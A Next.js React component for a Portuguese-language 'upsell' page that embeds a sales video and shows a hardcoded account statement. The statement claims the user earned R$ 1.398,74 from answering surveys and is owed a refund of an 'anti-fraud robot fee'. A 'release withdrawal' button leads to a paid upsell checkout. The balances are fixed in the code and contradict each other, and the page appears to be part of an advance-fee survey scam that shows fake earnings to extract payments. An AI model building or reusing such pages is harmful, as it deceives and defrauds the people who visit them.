"use client";
import { memo, useEffect, useState } from "react";
import { Button } from "@/components/ui/Button";
import { MdAccountBalanceWallet, MdAccountCircle, MdHome, MdKeyboardArrowDown, MdWarning } from "react-icons/md";
import Script from "next/script";
import { RiErrorWarningFill } from "react-icons/ri";
import { appendSrcParamToUrl } from "@/lib/urlParams";

const VSLComponent = memo(() => (
    <>
        <div
            dangerouslySetInnerHTML={{
                __html: `<div id="vid_6854e4f1f3276079e45b98af" style="position: relative; width: 100%; padding: 177.77777777777777% 0 0;">
                    <img id="thumb_6854e4f1f3276079e45b98af" src="https://images.converteai.net/6e06b2fa-daa1-4e58-a731-714580d4c400/players/6854e4f1f3276079e45b98af/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail">
                    <div id="backdrop_6854e4f1f3276079e45b98af" style="-webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%;">
                    </div>
                </div>`,
            }}
        />
        <Script
            type="text/javascript"
            id="scr_6854e4f1f3276079e45b98af"
            src="https://scripts.converteai.net/6e06b2fa-daa1-4e58-a731-714580d4c400/players/6854e4f1f3276079e45b98af/player.js"
            async
        />

    </>
));

// const VSLComponent = memo(() => (
//     <>
//         <div
//             dangerouslySetInnerHTML={{
//                 __html: `<div id="vid_6854e4a36ea118875f811527" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_6854e4a36ea118875f811527" src="https://images.converteai.net/6e06b2fa-daa1-4e58-a731-714580d4c400/players/6854e4a36ea118875f811527/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_6854e4a36ea118875f811527" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div>`,
//             }}
//         />
//         <Script
//             type="text/javascript"
//             id="scr_6854e4a36ea118875f811527"
//             src="https://scripts.converteai.net/6e06b2fa-daa1-4e58-a731-714580d4c400/players/6854e4a36ea118875f811527/player.js"
//             async
//         />

//     </>
// ));

export default function Upsell2Step6() {
    const [checkoutHref, setCheckoutHref] = useState("https://go.perfectpay.com.br/PPU38CPPTFL?upsell=true");
    useEffect(() => {
        setCheckoutHref(appendSrcParamToUrl("https://go.perfectpay.com.br/PPU38CPPTFL?upsell=true"));
    }, []);

    return (
        <div className="flex flex-col min-h-screen bg-[#fdf8ea]">
            {/* Header */}
            <div className="flex px-4 flex-col items-end pt-6">
                <span className="text-secondary text-2xl font-bold">{(1398.74).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL', maximumFractionDigits: 2, minimumFractionDigits: 2 })}</span>
                <span className="text-primary text-sm font-souvenir font-bold">US$ 226.70</span>
            </div>
            <hr className="mt-2" />

            {/* VSL Video with floating button */}
            <div className="relative w-10/12 mt-4 mx-auto mb-6">
                <VSLComponent />
                <a href="#extrato" className="absolute z-50 w-full flex justify-center text-nowrap left-1/2 -translate-x-1/2 -bottom-6 px-8 py-1">
                    <Button
                        animated
                        className="w-10/12 text-lg font-bold bg-primary text-white rounded-full py-3 shadow-lg flex items-center gap-2 justify-center"
                    >
                        Ver extrato <MdKeyboardArrowDown className="text-2xl" />
                    </Button>
                </a>
            </div>

            {/* Extrato Section */}
            <div id="extrato" className="w-full max-w-md text-primary font-semibold mx-auto bg-[#fdf8ea] rounded-t-2xl shadow-lg px-4 pt-8 pb-24 mt-8">
                <h2 className="text-4xl font-souvenir font-bold text-center mb-4 text-primary">Extrato</h2>
                <div className="text-lg font-bold text-primary mb-6">Resumo</div>
                <div className="flex flex-col gap-6 mb-4">
                    {/* Pesquisas respondidas */}
                    <div className="flex items-center">
                        <span className="text-sm">Pesquisas respondidas</span>
                        <div className="flex-1 mx-2 h-0.5 border-b border-dotted relative top-1 border-gray-300" style={{ borderStyle: 'dotted', borderWidth: '0 0 2px 0' }} />
                        <span className="font-bold">12</span>
                    </div>
                    {/* Valor Total Ganhado */}
                    <div className="flex items-center">
                        <span className="text-sm">Valor Total Ganhado</span>
                        <div className="flex-1 mx-2 h-0.5 border-b border-dotted relative top-1 border-gray-300" style={{ borderStyle: 'dotted', borderWidth: '0 0 2px 0' }} />
                        <span className="font-bold text-green-600">R$ 1.398,74</span>
                    </div>
                    {/* Valor Solicitado */}
                    <div className="flex items-center">
                        <span className="text-sm">Valor Solicitado</span>
                        <div className="flex-1 mx-2 h-0.5 border-b border-dotted relative top-1 border-gray-300" style={{ borderStyle: 'dotted', borderWidth: '0 0 2px 0' }} />
                        <span className="font-bold">R$ 50,00</span>
                    </div>
                    {/* Reembolso taxa robô Anti-fraude */}
                    <div className="flex items-center text-nowrap">
                        <span className="text-sm">Reembolso taxa robô Anti-fraude</span>
                        <div className="flex-1 mx-2 h-0.5 border-b border-dotted relative top-1 border-gray-300" style={{ borderStyle: 'dotted', borderWidth: '0 0 2px 0' }} />
                        <span className="font-bold">R$ 67,00</span>
                    </div>
                    <hr className="" />
                    <div className="flex items-center mb-4">
                        <span>Total a receber</span>
                        <div className="flex-1 mx-2 h-0.5 border-b border-dotted relative top-1 border-gray-300" style={{ borderStyle: 'dotted', borderWidth: '0 0 2px 0' }} />
                        <span className="font-bold text-green-600">R$ 117,00</span>
                    </div>
                </div>
                <div className="bg-gray-200 flex items-center gap-2 rounded-lg p-3 text-xs text-primary my-4">
                    <span className="font-bold">
                        <RiErrorWarningFill size={12} />
                    </span>
                    <p>
                        O pagamento solicitado de <span className="font-bold">R$ 1.398,74</span> + <span className="font-bold">R$ 67</span> do reembolso da taxa será processado via PIX de forma imediata.
                    </p>
                </div>
                <a href={checkoutHref} rel="noopener noreferrer">
                    <Button animated className="w-full bg-primary text-white font-bold py-3 text-lg rounded-full shadow-md">
                        Liberar saque
                    </Button>
                </a>
            </div>

            {/* Footer */}
            <footer className="w-full bg-[#f7f7f7] fixed bottom-0 border-t border-[#e6e6e6] flex justify-around items-center py-3 gap-8">
                <div>
                    <MdHome size={38} className="text-dark/50" />
                </div>
                <div>
                    <MdAccountBalanceWallet size={38} className="text-dark/80" />
                    <span className=" text-dark text-xs">Carteira</span>
                </div>
                <MdAccountCircle size={38} className="text-dark/50" />
            </footer>
        </div>
    );
}
